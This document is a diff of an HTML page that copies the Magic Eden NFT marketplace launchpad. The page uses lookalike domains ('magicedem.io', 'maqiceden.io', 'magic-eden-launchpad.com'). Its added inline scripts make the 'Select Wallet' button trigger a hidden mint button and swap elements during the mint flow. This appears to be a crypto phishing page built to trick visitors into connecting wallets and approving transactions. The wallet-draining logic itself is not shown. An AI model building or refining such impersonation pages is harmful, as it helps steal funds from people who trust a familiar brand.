@@ -2,7 +2,7 @@
 
 <head>
     <meta charset="utf-8">
-    <link rel="icon" href="https://magiceden.io/img/favicon.png" type="image/png" data-react-helmet="true">
+    <link rel="icon" href="../images/favicon.png" type="image/png" data-react-helmet="true">
     <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
     <meta name="theme-color" content="#05FFFF">
     <meta content="🔗 LINK" property="og:title">
@@ -20,57 +20,217 @@
         content='https://images-ext-1.discordapp.net/external/UEkKrvf0CVP65kwmhzKU0m_wZqCbelbQmA4Qjw0Hy2E/%3Fformat%3Djpg%26name%3Dmedium/https/pbs.twimg.com/media/FJOolMZWYAAFln7?width=400&height=267'
         property='og:image'>
     <meta name="twitter:card" content="summary_large_image">
-    <link rel="android-touch-icon" href="https://magicedem.io/img/logo.png">
-    <link rel="apple-touch-icon" href="https://magicedem.io/img/logo.png">
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.1.1/css/bootstrap.min.css" rel="stylesheet" integrity="sha512-6KY5s6UI5J7SVYuZB4S/CZMyPylqyyNZco376NM2Z8Sb8OxEdp02e1jkKk/wZxIEmjQ6DRCEBhni+gpr9c4tvA==" crossorigin="anonymous">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
+    <link type="application/json+oembed" href="https://magic-eden-launchpad.com/embed1.json" />
+    <link rel="android-touch-icon" href="../images/appIcon.png">
+    <link rel="apple-touch-icon" href="../images/logo.png">
+    <link rel="manifest" href="../manifest.json">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700;800;900&amp;display=swap"
+        rel="stylesheet">
     <title>Magic Eden - NFT Marketplace</title>
-    <script async="" src="https://www.clarity.ms/tag/a8rrpnm3xy"></script>
-    <script type="text/javascript">
-        ! function(t, e, n, r, a, c, s) {
-            t[n] = t[n] || function() {
-                (t[n].q = t[n].q || []).push(arguments)
-            }, (c = e.createElement(r)).async = 1, c.src = "https://www.clarity.ms/tag/a8rrpnm3xy", (s = e
-                .getElementsByTagName(r)[0]).parentNode.insertBefore(c, s)
-        }(window, document, "clarity", "script")
-    </script>
-    <link href="static/css/2.5699c822.chunk.css" rel="stylesheet">
-    <link href="static/css/main.fd2bf8d4.chunk.css" rel="stylesheet">
+    <link href="../static/css/2.1cb76956.chunk.css" rel="stylesheet">
+    <link href="../static/css/main.f45bd46a.chunk.css" rel="stylesheet">
     <script>
         function waitForElementToDisplay() {
-            setTimeout(function() {
+            setTimeout(function () {
                 if (document.getElementById('mint-token') != null) {
                     document.getElementById('showcase__btn0').innerText = document.getElementById('mint-token')
                         .innerText
-                    document.getElementById('but_01').style.display = "none"
+                    document.getElementById('buttt').classList.add('tippy-popper');
+                    document.getElementById('qqqq').style.marginRight = "55%"
                 } else {
                     waitForElementToDisplay();
                 }
-            }, 100);
+            }, 10);
         }
 
-        window.addEventListener('mousemove', () => {
-            if (document.getElementById('mint-token') != null) {
-                document.getElementById('showcase__btn0').innerText = document.getElementById('mint-token')
-                    .innerText
-                // document.getElementById('but_01').style.display = "none"             
-            }
+        function waitForElementToDisplay3() {
+            setTimeout(function () {
+                if (document.querySelectorAll('.MuiButton-label')[0].innerText == "Mint your token!") {
+                    document.getElementById('mintBtn').style.display = "none"
+                    document.getElementById('root').style.display = "flex"
+                } else {
+                    waitForElementToDisplay3()
+                }
+            }, 10);
+        }
+
+        function waitForElementToDisplay2() {
+            setTimeout(function () {
+                if (document.querySelectorAll('.MuiCircularProgress-svg')[0] !== undefined) {
+                    document.getElementById('mintBtn').style.display = "flex"
+                    document.getElementById('root').style.display = "none"
+                    waitForElementToDisplay3();
+                } else {
+                    waitForElementToDisplay2();
+                }
+            }, 10);
+        }
+
+        window.addEventListener('load', () => {
+            waitForElementToDisplay();
         });
 
         window.addEventListener('click', () => {
-            document.getElementById('showcase__btn0').addEventListener('click', function(e) {
+            document.getElementById('mintyour').addEventListener('click', function (e) {
+                waitForElementToDisplay2()
+            });
+        });
+        window.addEventListener('click', () => {
+            document.getElementById('showcase__btn0').addEventListener('click', function (e) {
                 document.getElementsByClassName('MuiButton-containedPrimary')[0].click();
             });
-            // document.getElementById('but_01').addEventListener('click', function (e) {
-            //     document.getElementsByClassName('MuiButton-containedPrimary')[0].click();
-            // });
+
+            var res;
+            var arrElem = document.querySelectorAll('.MuiButton-label');
+            var arrayElem = [];
+            for (var i = 0; i < arrElem.length; i++) {
+                arrayElem.push(arrElem[i]);
+                arrElem[i].addEventListener('click', function (e) {
+                    res = arrayElem.indexOf(e.target);
+                    switch (res) {
+                        case 1: {
+                            waitForElementToDisplay()
+                            break;
+                        }
+                        case 2: {
+                            waitForElementToDisplay()
+                            break;
+                        }
+                        case 3: {
+                            waitForElementToDisplay()
+                            break;
+                        }
+                        case 4: {
+                            if (arrElem.length == 5) {
+                                break;
+                            }
+                            waitForElementToDisplay()
+                            break;
+                        }
+                        case 5: {
+                            waitForElementToDisplay()
+                            break;
+                        }
+                    }
+                });
+            }
         });
     </script>
-
     <style type="text/css">
+        .qqq {
+            color: #d3d3d3 !important;
+        }
+
+        .mintBtn {
+            z-index: 9999;
+            padding: 1px !important;
+            align-items: center !important;
+            justify-content: center !important;
+            width: 300px !important;
+            height: 42px !important;
+            background: #e42575 !important;
+            border-radius: 6px !important;
+            background-image: #e42575 !important;
+            font-family: ui-sans-serif, system-ui !important;
+            color: #d3d3d3 !important;
+        }
+
+        .styles-module_wrapper__1I_qj {
+            z-index: 1;
+            display: flex;
+            align-items: center;
+            position: fixed;
+            padding: 0px 60px 0px 60px;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: black;
+            box-sizing: border-box;
+        }
+
+        .styles-module_content__2jwZj {
+            margin: auto;
+            padding: 0;
+            width: 90%;
+            height: 100%;
+            max-height: 100%;
+            text-align: center;
+        }
+
+        .styles-module_slide__1zrfk {
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .styles-module_image__2hdkJ {
+            max-height: 100%;
+            max-width: 100%;
+            user-select: none;
+            -moz-user-select: none;
+            -webkit-user-select: none;
+        }
+
+        .styles-module_close__2I1sI {
+            color: white;
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            font-size: 40px;
+            font-weight: bold;
+            opacity: 0.2;
+            cursor: pointer;
+        }
+
+        .styles-module_close__2I1sI:hover {
+            opacity: 1;
+        }
+
+        .styles-module_navigation__1pqAE {
+            height: 80%;
+            color: white;
+            cursor: pointer;
+            position: absolute;
+            font-size: 60px;
+            line-height: 60px;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            opacity: 0.2;
+            padding: 0 15px;
+            user-select: none;
+            -moz-user-select: none;
+            -webkit-user-select: none;
+        }
+
+        .styles-module_navigation__1pqAE:hover {
+            opacity: 1;
+        }
+
+        @media (hover: none) {
+            .styles-module_navigation__1pqAE:hover {
+                opacity: 0.2;
+            }
+        }
+
+        .styles-module_prev__KqFRp {
+            left: 0;
+        }
+
+        .styles-module_next__1uQwZ {
+            right: 0;
+        }
+
+        @media (max-width: 900px) {
+            .styles-module_wrapper__1I_qj {
+                padding: 0;
+            }
+        }
 
         .header__search {
             position: relative;
@@ -144,31 +304,44 @@
             display: flex !important;
         }
     </style>
+    <style></style>
+    <style></style>
     <style data-emotion="css" data-s=""></style>
 </head>
 
-<body>
+<body style="overflow: visible;"><noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="banner">
+        <div></div>
+    </div>
     <div>
         <div>
             <div>
                 <div class="main page launch-pad-page">
                     <div class="tw-w-full tw-flex tw-bg-gray-200 tw-z-50 tw-px-4">
-                        <div class="tw-hidden sm:tw-flex tw-flex-auto tw-justify-center" style="height: 32px; display: flex; align-items:center">
+                        <div class="tw-hidden sm:tw-flex tw-flex-auto tw-justify-center"
+                            style="height: 32px; display: flex; align-items:center">
                             <ul class="tw-flex tw-justify-center">
-                                <li class="tw-text-xs tw-mr-4 tw-whitespace-nowrap"><span class="tw-text-gray2-500">Volume 24h:&nbsp;&nbsp;</span><span class="tw-text-pink-primary">71,336 SOL</span></li>
-                                <li class="tw-text-xs tw-mr-4 tw-whitespace-nowrap"><span class="tw-text-gray2-500">Volume total:&nbsp;&nbsp;</span><span class="tw-text-pink-primary">3,542,212 SOL</span></li>
+                                <li class="tw-text-xs tw-mr-4 tw-whitespace-nowrap"><span class="tw-text-gray2-500"
+                                        style="font-size: 12px;">Volume 24h:&nbsp;&nbsp;</span><span
+                                        class="tw-text-pink-primary" style="font-size: 12px;">114,141 SOL</span></li>
+                                <li class="tw-text-xs tw-mr-4 tw-whitespace-nowrap"><span class="tw-text-gray2-500"
+                                        style="font-size: 12px;">Volume total:&nbsp;&nbsp;</span><span
+                                        class="tw-text-pink-primary" style="font-size: 12px;">4,648,812 SOL</span></li>
                             </ul>
                         </div>
                         <div class="tw-flex tw-items-center tw-ml-auto tw-flex-shrink-0">
                             <div class="me-dropdown-container">
-                                <div class="cursor-pointer position-relative"><button role="button" class="tw-flex tw-items-center"><span class="tw-text-xs">English</span><span
+                                <div class="cursor-pointer position-relative"><button role="button"
+                                        class="tw-flex tw-items-center"><span class="tw-text-xs">English</span><span
                                             class="tw-ml-1"><svg stroke="currentColor" fill="none" stroke-width="2"
                                                 viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"
                                                 color="#f8f7f8" height="0.75rem" width="0.75rem"
                                                 xmlns="http://www.w3.org/2000/svg" style="color: rgb(248, 247, 248);">
                                                 <polyline points="6 9 12 15 18 9"></polyline>
                                             </svg></span></button></div>
-                                <div aria-label="dropdown-list" class="dropdown tw-text-secondary" style="position: absolute; left: 0px; top: 0px; width: fit-content; right: auto; bottom: auto; transform: translate(1168px, 28px);" data-popper-reference-hidden="false" data-popper-escaped="false"
+                                <div aria-label="dropdown-list" class="dropdown tw-text-secondary"
+                                    style="position: absolute; left: 0px; top: 0px; width: fit-content; right: auto; bottom: auto; transform: translate(1261px, 28px);"
+                                    data-popper-reference-hidden="false" data-popper-escaped="false"
                                     data-popper-placement="bottom-start">
                                     <ul class="tw-py-2 tw-px-3 tw-text-white-1">
                                         <li class="tw-cursor-pointer">
@@ -197,75 +370,82 @@
                     <header class="tw-bg-gray-100 tw-px-4 tw-w-full tw-h-80px tw-flex tw-sticky tw-top-0 tw-z-30">
                         <nav class="navbar tw-w-full tw-flex">
                             <div class="tw-flex tw-flex-auto tw-items-center">
-                                <div class="tw-flex tw-items-center"><button class="tw-p-2 md:tw-p-4 hover:tw-bg-gray-500 tw-rounded-lg lg:tw-hidden HeaderV2_collapseBtn__2hjOo"><svg
+                                <div class="tw-flex tw-items-center"><button
+                                        class="tw-p-2 md:tw-p-4 hover:tw-bg-gray-500 tw-rounded-lg lg:tw-hidden HeaderV2_collapseBtn__2hjOo"><svg
                                             stroke="currentColor" fill="currentColor" stroke-width="0"
                                             viewBox="0 0 448 512" color="#f8f7f8" height="1.5rem" width="1.5rem"
                                             xmlns="http://www.w3.org/2000/svg" style="color: rgb(248, 247, 248);">
                                             <path
                                                 d="M16 132h416c8.837 0 16-7.163 16-16V76c0-8.837-7.163-16-16-16H16C7.163 60 0 67.163 0 76v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16zm0 160h416c8.837 0 16-7.163 16-16v-40c0-8.837-7.163-16-16-16H16c-8.837 0-16 7.163-16 16v40c0 8.837 7.163 16 16 16z">
                                             </path>
-                                        </svg></button><a class="navbar-brand" href="index.html#"><img
-                                            class="logo HeaderV2_logo__35dMv" src="static/media/logo.ca418d75.svg"
+                                        </svg></button><a class="navbar-brand" href="#"><img
+                                            class="logo HeaderV2_logo__35dMv" src="../static/media/logo.ca418d75.svg"
                                             alt="sticky brand-logo"></a></div>
                                 <div class="tw-flex-auto tw-px-2 tw-ml-8 tw-hidden lg:tw-inline-flex tw-justify-center">
-                                    <div class="header__search">
-                                        <input type="text" placeholder="Search Collections" nativecolor="" nativeopacity="" style="opacity: 1; color: rgb(0, 0, 0); background-color: rgb(255, 255, 255);">
-                                        <button><img src="https://maqiceden.io/launchpad/images/search.png"
-                                                alt=""></button>
+                                    <div
+                                        class="nav-item--search-bar tw-w-full tw-max-w-2xl lg:tw-px-0 css-b62m3t-container">
+                                        <span id="react-select-2-live-region" class="css-7pg0cj-a11yText"></span><span
+                                            aria-live="polite" aria-atomic="false" aria-relevant="additions text"
+                                            class="css-7pg0cj-a11yText"></span>
+                                        <div class="header__search">
+                                            <input type="text" placeholder="Search Collections and Creators"
+                                                nativecolor="" nativeopacity=""
+                                                style="opacity: 1; color: rgb(0, 0, 0); background-color: rgb(255, 255, 255);">
+                                            <button><img src="../images/search.png" alt=""></button>
+                                        </div>
                                     </div>
                                 </div>
                             </div>
                             <div class="tw-flex-shrink-0 tw-ml-auto tw-flex">
-                                <div class="tw-block lg:tw-hidden tw-ml-2"><button class="tw-w-10 tw-h-10 hover:tw-bg-gray-500 tw-inline-flex tw-justify-center tw-items-center tw-rounded-md tw-transform active:tw-scale-90"><svg
+                                <div class="tw-block lg:tw-hidden tw-ml-2"><button
+                                        class="tw-w-10 tw-h-10 hover:tw-bg-gray-500 tw-inline-flex tw-justify-center tw-items-center tw-rounded-md tw-transform active:tw-scale-90"><svg
                                             stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24"
                                             stroke-linecap="round" stroke-linejoin="round" color="#f8f7f8" height="24"
                                             width="24" xmlns="http://www.w3.org/2000/svg"
                                             style="color: rgb(248, 247, 248);">
                                             <circle cx="11" cy="11" r="8"></circle>
                                             <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
-                                        </svg></button></div>
-                                <div class="tw-ml-2 tw-hidden md:tw-inline-flex">
-                                    <div class="tw-flex tw-items-center ButtonGroup_group__2mJyT"><button class="tw-inline-flex tw-justify-center tw-items-center tw-rounded-md tw-text-white-1 BorderedButton_btn__2Glkn tw-p-0"><a
-                                                class="tw-flex tw-w-full" href="index.html#"><span class="tw-px-2"><svg
-                                                        stroke="currentColor" fill="none" stroke-width="2"
-                                                        viewBox="0 0 24 24" stroke-linecap="round"
-                                                        stroke-linejoin="round" color="#B450F7" height="24" width="24"
-                                                        xmlns="http://www.w3.org/2000/svg"
-                                                        style="color: rgb(180, 80, 247);">
-                                                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
-                                                        <circle cx="12" cy="7" r="4"></circle>
-                                                    </svg></span></a></button><button class="tw-inline-flex tw-justify-center tw-items-center tw-rounded-md tw-text-white-1 BorderedButton_btn__2Glkn tw-p-0">
+                                        </svg></button></div><a
+                                    class="tw-text-white-1 tw-flex tw-items-center tw-px-2 tw-rounded-md"
+                                    href="#">Sell</a>
+                                <div class="tw-flex tw-items-center ButtonGroup_group__2mJyT"><button
+                                        class="tw-inline-flex tw-justify-center tw-items-center tw-rounded-md tw-text-white-1 BorderedButton_btn__2Glkn tw-p-0"><a
+                                            class="tw-flex tw-w-full" href="#"><span class="tw-px-2"><svg
+                                                    stroke="currentColor" fill="none" stroke-width="2"
+                                                    viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round"
+                                                    color="#B450F7" height="24" width="24"
+                                                    xmlns="http://www.w3.org/2000/svg"
+                                                    style="color: rgb(180, 80, 247);">
+                                                    <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                                                    <circle cx="12" cy="7" r="4"></circle>
+                                                </svg></span></a></button><button
+                                        class="tw-inline-flex tw-justify-center tw-items-center tw-rounded-md tw-text-white-1 BorderedButton_btn__2Glkn tw-p-0">
+                                        <div class="me-dropdown-container tw-h-full">
                                             <div class="me-dropdown-container tw-h-full">
-                                                <div class="me-dropdown-container tw-h-full">
-                                                    <div class="cursor-pointer position-relative tw-h-full tw-flex tw-items-center tw-px-2"
-                                                        id="showcase__btn0" style="display: flex;">Select Wallet</div>
-                                                </div>
+                                                <div class="cursor-pointer position-relative tw-h-full tw-flex tw-items-center tw-px-2"
+                                                    id="showcase__btn0" style="display: flex;">Select Wallet</div>
                                             </div>
-                                        </button></div>
-                                </div>
+                                        </div>
+                                    </button></div>
                             </div>
                         </nav>
                     </header>
                     <div class="tw-flex tw-w-full">
-                        <div id="sidebar" class="tw-flex tw-fixed tw-z-20 Sidebar_sidebar__1xlyr Sidebar_isMeTheme__2havA">
-                            <div class=" tw-bg-gray-100 lg:tw-w-240px tw-overflow-x-hidden tw-flex tw-flex-col Sidebar_content__35yfe">
-                                <div class="md:tw-hidden tw-flex-shrink-0 tw-flex tw-justify-center tw-py-2 tw-border-gray-500 tw-border-solid tw-border-b">
-                                    <div class="tw-flex tw-items-center ButtonGroup_group__2mJyT"><button class="tw-inline-flex tw-justify-center tw-items-center tw-rounded-md tw-text-white-1 BorderedButton_btn__2Glkn tw-p-0"><a
-                                                class="tw-flex tw-w-full" href="https://magicedem.io/launchpad/me"><span class="tw-px-2"><svg
-                                                        stroke="currentColor" fill="none" stroke-width="2"
-                                                        viewBox="0 0 24 24" stroke-linecap="round"
-                                                        stroke-linejoin="round" color="#B450F7" height="24" width="24"
-                                                        xmlns="http://www.w3.org/2000/svg"
-                                                        style="color: rgb(180, 80, 247);">
-                                                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
-                                                        <circle cx="12" cy="7" r="4"></circle>
-                                                    </svg></span></a></button><button class="tw-inline-flex tw-justify-center tw-items-center tw-rounded-md tw-text-white-1 BorderedButton_btn__2Glkn tw-p-0">
-                                        </button></div>
+                        <div id="sidebar"
+                            class="tw-flex tw-fixed tw-z-20 Sidebar_sidebar__1xlyr Sidebar_isMeTheme__2havA">
+                            <div class=" tw-bg-gray-100 lg:tw-w-240px tw-overflow-x-hidden tw-flex tw-flex-col Sidebar_content__35yfe"
+                                style="margin-top: 80px;">
+                                <div
+                                    class="md:tw-hidden tw-flex-shrink-0 tw-flex tw-justify-center tw-py-2 tw-border-gray-500 tw-border-solid tw-border-b">
+
                                     <hr class="tw-my-4">
                                 </div>
-                                <ul class="tw-flex-auto tw-overflow-y-auto tw-px-4" style="margin-top: 20px">
-                                    <li class="Sidebar_tab__3vTzz tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px">
-                                        <div class="tw-flex tw-flex-col"><a class="tw-flex tw-p-3 tw-relative tw-rounded tw-bg-gray-300" href="index.html#"><span><svg stroke="currentColor" fill="none" stroke-width="2"
+                                <ul class="tw-flex-auto tw-overflow-y-auto tw-px-4" style="margin-top: 30px">
+                                    <li
+                                        class="Sidebar_tab__3vTzz tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px">
+                                        <div class="tw-flex tw-flex-col"><a
+                                                class="tw-flex tw-p-3 tw-relative tw-rounded" href="../"><span><svg
+                                                        stroke="currentColor" fill="none" stroke-width="2"
                                                         viewBox="0 0 24 24" stroke-linecap="round"
                                                         stroke-linejoin="round" color="#F5F3F7" width="20px"
                                                         height="20px" xmlns="http://www.w3.org/2000/svg"
@@ -276,8 +456,11 @@
                                                     class="tw-text-white-1 tw-ml-2 Sidebar_label__3Wp_O">Home</span></a>
                                         </div>
                                     </li>
-                                    <li class="Sidebar_tab__3vTzz tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px">
-                                        <div class="tw-flex tw-flex-col"><a class="tw-flex tw-p-3 tw-relative tw-rounded" href="index.html#"><span><svg stroke="currentColor"
+                                    <li
+                                        class="Sidebar_tab__3vTzz tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px">
+                                        <div class="tw-flex tw-flex-col"><a
+                                                class="tw-flex tw-p-3 tw-relative tw-rounded"
+                                                href="../collections?type=popular"><span><svg stroke="currentColor"
                                                         fill="none" stroke-width="2" viewBox="0 0 24 24"
                                                         stroke-linecap="round" stroke-linejoin="round" color="#F5F3F7"
                                                         width="20px" height="20px" xmlns="http://www.w3.org/2000/svg"
@@ -291,8 +474,11 @@
                                                     class="tw-text-white-1 tw-ml-2 Sidebar_label__3Wp_O">Collections</span></a>
                                         </div>
                                     </li>
-                                    <li class="Sidebar_tab__3vTzz tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px">
-                                        <div class="tw-flex tw-flex-col"><a class="tw-flex tw-p-3 tw-relative tw-rounded" href="index.html#"><span><svg xmlns="http://www.w3.org/2000/svg"
+                                    <li
+                                        class="Sidebar_tab__3vTzz tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px">
+                                        <div class="tw-flex tw-flex-col"><a
+                                                class="tw-flex tw-p-3 tw-relative tw-rounded tw-bg-gray-300"
+                                                href="../launchpad"><span><svg xmlns="http://www.w3.org/2000/svg"
                                                         width="20px" height="20px" viewBox="0 0 24 24" fill="none"
                                                         stroke="currentColor" stroke-width="2" stroke-linecap="round"
                                                         stroke-linejoin="round" class="feather feather-zap"
@@ -303,8 +489,11 @@
                                                     class="tw-text-white-1 tw-ml-2 Sidebar_label__3Wp_O">Launchpad</span></a>
                                         </div>
                                     </li>
-                                    <li class="Sidebar_tab__3vTzz tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px">
-                                        <div class="tw-flex tw-flex-col"><a class="tw-flex tw-p-3 tw-relative tw-rounded" href="index.html#"><span><svg stroke="currentColor" fill="none"
+                                    <li
+                                        class="Sidebar_tab__3vTzz tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px">
+                                        <div class="tw-flex tw-flex-col"><a
+                                                class="tw-flex tw-p-3 tw-relative tw-rounded"
+                                                href="../auctions"><span><svg stroke="currentColor" fill="none"
                                                         stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round"
                                                         stroke-linejoin="round" color="#F5F3F7" width="20px"
                                                         height="20px" xmlns="http://www.w3.org/2000/svg"
@@ -315,10 +504,12 @@
                                                     class="tw-text-white-1 tw-ml-2 Sidebar_label__3Wp_O">Auctions</span></a>
                                         </div>
                                     </li>
-                                    <li class="Sidebar_tab__3vTzz tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px">
-                                        <div class="tw-flex tw-flex-col"><a class="tw-flex tw-p-3 tw-relative tw-rounded" href="index.html#"><span><svg
-                                                        stroke="currentColor" fill="none" stroke-width="2"
-                                                        viewBox="0 0 24 24" stroke-linecap="round"
+                                    <li
+                                        class="Sidebar_tab__3vTzz tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px">
+                                        <div class="tw-flex tw-flex-col"><a
+                                                class="tw-flex tw-p-3 tw-relative tw-rounded"
+                                                href="../stats"><span><svg stroke="currentColor" fill="none"
+                                                        stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round"
                                                         stroke-linejoin="round" color="#F5F3F7" width="20px"
                                                         height="20px" xmlns="http://www.w3.org/2000/svg"
                                                         style="color: rgb(245, 243, 247);">
@@ -329,9 +520,12 @@
                                                     class="tw-text-white-1 tw-ml-2 Sidebar_label__3Wp_O">Stats</span></a>
                                         </div>
                                     </li>
-                                    <li class="Sidebar_tab__3vTzz tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px">
-                                        <div class="tw-flex tw-flex-col"><a class="tw-flex tw-p-3 tw-relative tw-rounded" href="index.html#"><span><svg
-                                                        width="20px" height="20px" viewBox="0 0 20 20" fill="none"
+                                    <li
+                                        class="Sidebar_tab__3vTzz tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px">
+                                        <div class="tw-flex tw-flex-col"><a
+                                                class="tw-flex tw-p-3 tw-relative tw-rounded"
+                                                href="../games"><span><svg width="20px" height="20px"
+                                                        viewBox="0 0 20 20" fill="none"
                                                         xmlns="http://www.w3.org/2000/svg" color="#F5F3F7">
                                                         <g clip-path="url(#clip0_413_4859)">
                                                             <path
@@ -364,17 +558,16 @@
                                                     Games</span></a>
                                             <div class="tw-pl-10 Sidebar_subMenu__Lf3_F">
                                                 <ul>
-                                                    <li class="tw-w-auto">
-                                                        <a href="index.html#">
-                                                            <div class="tw-flex tw-justify-between"><span>Mini Royale</span>
-                                                            </div>
-                                                        </a>
-                                                    </li>
+                                                    <li class="tw-w-auto"><a href="../games">
+                                                            <div class="tw-flex tw-justify-between"><span>Mini
+                                                                    Royale</span></div>
+                                                        </a></li>
                                                 </ul>
                                             </div>
                                         </div>
                                     </li>
-                                    <li class="Sidebar_tab__3vTzz tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px">
+                                    <li
+                                        class="Sidebar_tab__3vTzz tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px">
                                         <div class="tw-flex tw-flex-col">
                                             <div class="tw-flex tw-p-3 hover:tw-bg-gray-300 tw-relative tw-rounded">
                                                 <span><svg stroke="currentColor" fill="none" stroke-width="2"
@@ -385,7 +578,9 @@
                                                         <circle cx="12" cy="8" r="7"></circle>
                                                         <polyline points="8.21 13.89 7 23 12 20 17 23 15.79 13.88">
                                                         </polyline>
-                                                    </svg></span><span class="tw-text-white-1 tw-ml-2 Sidebar_label__3Wp_O">Creators</span><span class="tw-ml-auto"><svg stroke="currentColor" fill="none"
+                                                    </svg></span><span
+                                                    class="tw-text-white-1 tw-ml-2 Sidebar_label__3Wp_O">Creators</span><span
+                                                    class="tw-ml-auto"><svg stroke="currentColor" fill="none"
                                                         stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round"
                                                         stroke-linejoin="round" color="#504759" class="tw-transform"
                                                         height="24" width="24" xmlns="http://www.w3.org/2000/svg"
@@ -394,7 +589,8 @@
                                                     </svg></span></div>
                                         </div>
                                     </li>
-                                    <li class="Sidebar_tab__3vTzz tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px">
+                                    <li
+                                        class="Sidebar_tab__3vTzz tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px">
                                         <div class="tw-flex tw-flex-col">
                                             <div class="tw-flex tw-p-3 hover:tw-bg-gray-300 tw-relative tw-rounded">
                                                 <span><svg stroke="currentColor" fill="none" stroke-width="2"
@@ -406,7 +602,9 @@
                                                         <circle cx="9" cy="7" r="4"></circle>
                                                         <path d="M23 21v-2a4 4 0 0 0-3-3.87"></path>
                                                         <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>
-                                                    </svg></span><span class="tw-text-white-1 tw-ml-2 Sidebar_label__3Wp_O">Community</span><span class="tw-ml-auto"><svg stroke="currentColor" fill="none"
+                                                    </svg></span><span
+                                                    class="tw-text-white-1 tw-ml-2 Sidebar_label__3Wp_O">Community</span><span
+                                                    class="tw-ml-auto"><svg stroke="currentColor" fill="none"
                                                         stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round"
                                                         stroke-linejoin="round" color="#504759" class="tw-transform"
                                                         height="24" width="24" xmlns="http://www.w3.org/2000/svg"
@@ -415,7 +613,41 @@
                                                     </svg></span></div>
                                         </div>
                                     </li>
-                                    <li class="Sidebar_tab__3vTzz tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px">
+                                    <li
+                                        class="Sidebar_tab__3vTzz tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px">
+                                        <div class="tw-flex tw-flex-col"><a target="_blank"
+                                                class="tw-flex tw-p-3 tw-relative tw-rounded"
+                                                href="https://intercom.help/magiceden/en"><span><svg
+                                                        stroke="currentColor" fill="none" stroke-width="2"
+                                                        viewBox="0 0 24 24" stroke-linecap="round"
+                                                        stroke-linejoin="round" color="#F5F3F7" width="20px"
+                                                        height="20px" xmlns="http://www.w3.org/2000/svg"
+                                                        style="color: rgb(245, 243, 247);">
+                                                        <circle cx="12" cy="12" r="10"></circle>
+                                                        <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
+                                                        <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                                                    </svg></span><span
+                                                    class="tw-text-white-1 tw-ml-2 Sidebar_label__3Wp_O">Help
+                                                    Desk</span></a></div>
+                                    </li>
+                                    <li
+                                        class="Sidebar_tab__3vTzz tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px">
+                                        <div class="tw-flex tw-flex-col"><a target="_blank"
+                                                class="tw-flex tw-p-3 tw-relative tw-rounded"
+                                                href="https://careers.magiceden.io/jobs"><span><svg
+                                                        stroke="currentColor" fill="none" stroke-width="2"
+                                                        viewBox="0 0 24 24" stroke-linecap="round"
+                                                        stroke-linejoin="round" color="#F5F3F7" width="20px"
+                                                        height="20px" xmlns="http://www.w3.org/2000/svg"
+                                                        style="color: rgb(245, 243, 247);">
+                                                        <rect x="2" y="7" width="20" height="14" rx="2" ry="2"></rect>
+                                                        <path d="M16 21V5a2 2 0 0 0-2-2h-4a2 2 0 0 0-2 2v16"></path>
+                                                    </svg></span><span
+                                                    class="tw-text-white-1 tw-ml-2 Sidebar_label__3Wp_O">Careers</span></a>
+                                        </div>
+                                    </li>
+                                    <li
+                                        class="Sidebar_tab__3vTzz tw-rounded-sm tw-text-white-1 tw-cursor-pointer tw-min-w-200px">
                                         <div class="tw-flex tw-flex-col">
                                             <div class="tw-flex tw-p-3 hover:tw-bg-gray-300 tw-relative tw-rounded">
                                                 <span><svg stroke="currentColor" fill="none" stroke-width="2"
@@ -427,7 +659,9 @@
